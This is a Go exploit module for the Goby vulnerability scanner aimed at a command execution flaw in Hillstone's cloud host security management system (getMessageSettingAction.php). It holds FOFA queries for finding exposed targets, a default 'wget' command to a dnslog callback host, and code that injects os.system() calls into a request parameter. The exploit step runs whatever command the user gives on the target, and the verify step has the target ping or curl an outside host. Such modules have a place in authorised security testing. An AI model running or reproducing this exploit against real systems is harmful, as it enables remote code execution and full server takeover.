package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"time"
)

func init() {
	expJson := `{
    "Name": "HillStone Networks Cloud authentication host security management system getMessageSettingAction.php Command Execution Vulnerability",
    "Description": "<p>HillStone Networks Cloud authentication host security management system is a HillStone Networks around the host detection, response, prevention management system.</p><p>HillStone Networks Cloud authentication host security management system getMessageSettingAction.php has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "HillStone Networks Cloud authentication host security management system",
    "Homepage": "https://www.hillstonenet.com.cn/",
    "DisclosureDate": "2022-07-14",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"山石网科版权所有\" && body=\" 山石云鉴主机安全管理系统\"",
    "GobyQuery": "body=\"山石网科版权所有\" && body=\" 山石云鉴主机安全管理系统\"",
    "Level": "3",
    "Impact": "<p>HillStone Networks Cloud authentication host security management system getMessageSettingAction.php has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.hillstonenet.com.cn/\">https://www.hillstonenet.com.cn/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "wget 1ad.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "山石网科云鉴主机安全管理系统 getMessageSettingAction.php 命令执行漏洞",
            "Product": "山石网科云鉴主机安全管理系统",
            "Description": "<p>山石网科云鉴主机安全管理系统是山石网科旗下一款围绕主机检测、响应、预防的管理系统。<br></p><p>山石网科云鉴主机安全管理系统 getMessageSettingAction.php 存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.hillstonenet.com.cn/\">https://www.hillstonenet.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>山石网科云鉴主机安全管理系统 getMessageSettingAction.php 存在命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "HillStone Networks Cloud authentication host security management system getMessageSettingAction.php Command Execution Vulnerability",
            "Product": "HillStone Networks Cloud authentication host security management system",
            "Description": "<p>HillStone Networks Cloud authentication host security management system is a HillStone Networks around the host detection, response, prevention management system.<br></p><p>HillStone Networks Cloud authentication host security management system getMessageSettingAction.php has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.hillstonenet.com.cn/\">https://www.hillstonenet.com.cn/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>HillStone Networks Cloud authentication host security management system getMessageSettingAction.php has a command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri := "/admin/ajax/getMessageSettingAction.php"
			cfg1 := httpclient.NewGetRequestConfig(uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(u, cfg1)
			if err != nil {
				return false
			}
			if resp.StatusCode != 200 {
				return false
			}
			checkStr := goutils.RandomHexString(4)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)
			if len(checkUrl) == 0 {
				return false
			}
			cmd := "ping -c 2 " + checkUrl
			if !isDomain {
				cmd = "curl " + checkUrl
			}
			uri = fmt.Sprintf("?company_uuid=1\",\"a\":os.system('%s'),\"b\":\"1&platform_sel=4", cmd)
			uri = url.QueryEscape(uri)
			cfg1 = httpclient.NewPostRequestConfig("/admin/ajax/getMessageSettingAction.php" + uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "PHPSESSID=hsedr")
			cfg1.Data = "fw_action=loginAction"
			_, err = httpclient.DoHttpRequest(u, cfg1)
			if err != nil {
				return false
			}
			return godclient.PullExists(checkStr, 10*time.Second)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/admin/ajax/getMessageSettingAction.php"
			cfg1 := httpclient.NewGetRequestConfig(uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 {
				return expResult
			}
			cmd := ss.Params["cmd"].(string)
			uri = fmt.Sprintf("?company_uuid=1\",\"a\":os.system('%s'),\"b\":\"1&platform_sel=4", cmd)
			uri = url.QueryEscape(uri)
			cfg1 = httpclient.NewPostRequestConfig("/admin/ajax/getMessageSettingAction.php" + uri)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Cookie", "PHPSESSID=hsedr")
			cfg1.Data = "fw_action=loginAction"
			_, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if err != nil {
				return expResult
			}
			expResult.Success = true
			expResult.Output = "命令执行成功"
			return expResult
		},
	))
}
